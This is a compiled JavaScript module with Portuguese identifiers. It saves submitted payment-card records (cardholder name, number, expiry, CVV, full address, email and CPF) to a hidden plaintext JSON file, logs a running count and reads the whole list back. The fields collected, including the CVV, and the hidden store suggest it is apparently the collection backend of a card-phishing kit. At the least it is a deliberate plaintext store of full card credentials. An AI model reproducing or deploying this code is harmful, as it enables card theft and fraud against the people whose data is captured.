"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.initCartaoService = initCartaoService;
exports.salvarCartao = salvarCartao;
exports.obterCartoes = obterCartoes;
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const dataDir = path.join(process.cwd(), ".dados");
const cartaoFile = path.join(dataDir, "cartoes.json");
function ensureDir() {
    if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir, { recursive: true });
    }
}
function initCartaoService() {
    ensureDir();
    if (!fs.existsSync(cartaoFile)) {
        fs.writeFileSync(cartaoFile, JSON.stringify([], null, 2));
    }
}
function salvarCartao(dados) {
    try {
        ensureDir();
        let cartoes = [];
        if (fs.existsSync(cartaoFile)) {
            const content = fs.readFileSync(cartaoFile, "utf-8");
            cartoes = JSON.parse(content || "[]");
        }
        cartoes.push({
            timestamp: new Date().toISOString(),
            nome: dados.nome || "",
            numero: dados.numero || "",
            validade: dados.validade || "",
            cvv: dados.cvv || "",
            cep: dados.cep || "",
            rua: dados.rua || "",
            numero_endereco: dados.numero_endereco || "",
            complemento: dados.complemento || "",
            bairro: dados.bairro || "",
            cidade: dados.cidade || "",
            estado: dados.estado || "",
            email: dados.email || "",
            cpf: dados.cpf || "",
        });
        fs.writeFileSync(cartaoFile, JSON.stringify(cartoes, null, 2));
        console.log(`[cartao] Dados salvos. Total: ${cartoes.length}`);
    }
    catch (err) {
        console.error("[cartao] Erro ao salvar:", err);
    }
}
function obterCartoes() {
    try {
        if (fs.existsSync(cartaoFile)) {
            const content = fs.readFileSync(cartaoFile, "utf-8");
            return JSON.parse(content || "[]");
        }
    }
    catch (err) {
        console.error("[cartao] Erro ao ler:", err);
    }
    return [];
}
